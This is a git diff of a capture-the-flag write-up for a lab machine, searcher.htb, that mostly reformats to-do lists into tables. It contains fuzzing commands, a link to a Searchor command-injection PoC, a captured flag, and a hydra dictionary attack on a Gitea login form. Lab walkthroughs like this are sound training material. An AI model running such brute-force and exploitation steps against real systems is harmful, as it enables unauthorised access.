@@ -33,17 +33,18 @@ PORT   STATE SERVICE VERSION
 |_http-server-header: Apache/2.4.52 (Ubuntu)
 ```
 
- To-do: 
-  1. Add domain to local DNS
-  2. Visit domain via browser
-  3. Rescan port `80`
-  4. Directory fuzzing
-  5. Sub-domain fuzzing
-  6. Vhost fuzzing
+To-do list:
 
-## Step 1
+| **Step** | **Description**                          |
+|----------|------------------------------------------|
+| 1        | Add domain to local DNS                  |
+| 2        | Explore domain via browser               |
+| 3        | Rescan port 80                           |
+| 4        | Directory, sub-domain, and vhost fuzzing |
 
-### Add domain to local DNS
+## Initial foothold
+
+Add domain to local DNS:
 
 ```bash
 # adding domain on local DNS file
@@ -51,11 +52,11 @@ $ grep htb /etc/hosts
 10.10.11.208    searcher.htb
 ```
 
-### Visit domain via browser
+Explore domain via browser:
 
 ![](searchorVersion.png)
 
-### Rescan port `80`
+Rescan port `80`:
 
 ```bash
 # web server re-scan
@@ -69,7 +70,7 @@ PORT   STATE SERVICE VERSION
 |_http-title: Searcher
 ```
 
-### Directory, sub-domain, and vhost fuzzing
+Directory, sub-domain, and vhost fuzzing:
 
 ```bash
 # directory fuzzing
@@ -89,18 +90,18 @@ gitea                   [Status: 200, Size: 13237, Words: 1009, Lines: 268, Dura
 :: Progress: [151265/151265] :: Job [1/1] :: 1408 req/sec :: Duration: [0:02:30] :: Errors: 0 ::
 ```
 
-### To-do
+To-do list:
 
-1. Add `gitea.searcher.htb` to local DNS file
-2. Search known vulns for `Searchor 2.4.0`
-3. Visit sub-domain via browser
-4. Directory fuzzing for vhost
-5. Learn about `Gitea` and `Werkzeug`
-6. Search known vulns for `Werkzeug/2.1.2` and `Python/3.10.6`
+| **Step** | **Description**                                             |
+|----------|-------------------------------------------------------------|
+| 1        | Add `gitea.searcher.htb` to local DNS file                  |
+| 2        | Search known vulns for `Searchor 2.4.0`                     |
+| 3        | Visit sub-domain via browser                                |
+| 4        | Directory fuzzing for vhost                                 |
+| 5        | Learn about `Gitea` and `Werkzeug`                          |
+| 6        | Search known vulns for `Werkzeug/2.1.2` and `Python/3.10.6` |
 
-## Step 2
-
-### Add `gitea.searcher.htb` to local DNS file
+Add `gitea.searcher.htb` to local DNS file:
 
 ```bash
 # adding vhost to local DNS file
@@ -108,24 +109,24 @@ $ grep htb /etc/hosts
 10.10.11.208    searcher.htb gitea.searcher.htb
 ```
 
-### Search known vulns for `Searchor 2.4.0`
+Search known vulns for `Searchor 2.4.0`:
 
 ![](googleSearchor.png){: .normal width="70%"}
 
-### Visit sub-domain via browser
+Visit sub-domain via browser:
 
 ![](giteaVersion.png)
 
 ![](giteaUsers.png){: .normal}
 
-### Directory fuzzing for vhost
+Directory fuzzing for vhost:
 
 ```bash
 # directory fuzzing for vhost
 $ ffuf -u http://gitea.searcher.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -c -ac -recursion -recursion-depth 1 -e .py,.aspx,.html,.php,.txt,.jsp -ic -v
 ```
 
-### Learn about `Gitea` and `Werkzeug`
+Learn about `Gitea` and `Werkzeug`:
 
 According to Gitea's [documentation](https://docs.gitea.com/):
 
@@ -137,19 +138,17 @@ Based on [testdriven.io](https://testdriven.io/blog/what-is-werkzeug/):
 >
 > **Werkzeug** _is a collection of libraries that can be used to create a WSGI (Web Server Gateway Interface) compatible web application in Python_. **A WSGI (Web Server Gateway Interface)** _server is necessary for Python web applications since a web server cannot communicate directly with Python_. **WSGI is an interface between a web server and a Python-based web application**. _Put another way, **Werkzeug provides a set of utilities for creating a Python application that can talk to a WSGI server**._
 
-### Search known vulns for `Werkzeug/2.1.2` and `Python/3.10.6`
+Searching known vulns for `Werkzeug/2.1.2` and `Python/3.10.6` did not return anything of interest.
 
-Nothing interesting comes up.
+To-do list:
 
-### To-do
+| **Step** | **Description**                                                                         |
+|----------|-----------------------------------------------------------------------------------------|
+| 1        | Try RCE PoC for `Searchor 2.4.0`                                                        |
+| 2        | Search known vulns for `Gitea 1.18.0`                                                   |
+| 3        | Brute force for users found under `/explore/organizations`: `cody` and `administrator`. |
 
-1. Try RCE PoC for `Searchor 2.4.0`
-2. Search known vulns for `Gitea 1.18.0`
-3. Brute force for users found under `/explore/organizations`: `cody` and `administrator`. 
-
-## Step 3
-
-### Try RCE PoC for `Searchor 2.4.0`
+Try RCE PoC for `Searchor 2.4.0`:
 
 >[Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection](https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection)
 
@@ -180,13 +179,15 @@ cat ~/user.txt
 0cd960c6e0b2ed34c9d74fa2976f8e0d
 ```
 
-### Search known vulns for `Gitea 1.18.0`
-
-Nothing interesting comes back.
-
-### Brute force the login form
-
-In order to brute force the login form we need to first obtain the appropriate information:
+Search known vulns for `Gitea 1.18.0` gives us nothing back. Let's try our brute force attack (BFA) the login form. In order to perform our BFA we need to obtain the required information: 
+- Is it a Basic Auth or Login Form?
+	- In our case it is the latter.
+- Is is a `GET` or a `POST` login form?
+	- If it passes parameters within the URL address bar, it is a `GET`, otherwise it is a `POST`.
+- What are the parameters?
+	- We can discover that using burp, zap, or just brower's tools.
+- What is unique on the page during a failed login attempt?
+	- We can find that by looking the page source code.
 
 1. When we attempt to login with random creds, no parameters are added to the URL address bar, such as `username` and `password`, so it is a `POST` form:
 
@@ -205,29 +206,29 @@ In order to brute force the login form we need to first obtain the appropriate i
 	_csrf=KFFUC4l7C5mnfe_ObzIWX3rMLgs6MTcwNjU1NjQxOTE0Mjk5OTQwOQ&user_name=test&password=test
 	```
 
-Now, we are ready to create a user list with just the 2 usernames and attempt a dictionary attack:
+4. Now, we are ready to create a user list with just the 2 usernames and attempt a dictionary attack:
 
-```bash
-# create a user list
-$ cat userList
-administrator
-cody
-# perform a dictionary attack
-$ hydra -L userList -P /usr/share/wordlists/rockyou.txt 10.10.11.208 http-post-form "/user/login:user_name=^USER^&password=^PASS^:F=Username or password is incorrect." -f
-```
+	```bash
+	# create a user list
+	$ cat userList
+	administrator
+	cody
+	# perform a dictionary attack
+	$ hydra -L userList -P /usr/share/wordlists/rockyou.txt 10.10.11.208 http-post-form "/user/login:user_name=^USER^&password=^PASS^:F=Username or password is incorrect." -f
+	```
 
-Unfortunately, nothing comes back!
-### To-do
+	Unfortunately, nothing comes back!
 
-1. Stabilize shell
-2. Search for privilege escalation paths:
-	- SUIDs
-	- Kernel version and OS version
-	- Sensitive data and config files
+To-do list:
 
-## Step 4
+| **Step** | **Description**                                                                               |
+|----------|-----------------------------------------------------------------------------------------------|
+| 1        | Stabilize shell                                                                               |
+| 2        | Search for privilege escalation paths: SUIDS, kernel/OS version, sensitive data, config files |
 
-### Stabilize shell
+## Privilege escalation
+
+Stabilize shell
 
 ```bash
 # stabilize shell
